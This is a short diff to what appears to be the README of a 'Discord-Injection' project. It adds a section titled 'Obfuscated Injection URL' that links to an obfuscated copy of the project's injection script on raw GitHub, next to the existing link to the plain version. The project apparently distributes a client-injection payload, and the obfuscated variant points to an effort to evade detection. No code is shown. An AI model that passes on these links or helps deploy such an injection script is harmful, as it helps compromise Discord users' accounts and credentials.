@@ -7,6 +7,11 @@
 https://raw.githubusercontent.com/KingKrex69/Discord-Injection/main/injection.js
 ```
 
+### Obfuscated Injection URL
+```
+https://raw.githubusercontent.com/KingKrex69/Discord-Injection/main/injection-obfuscated.js
+```
+
 
 ### Features:
 
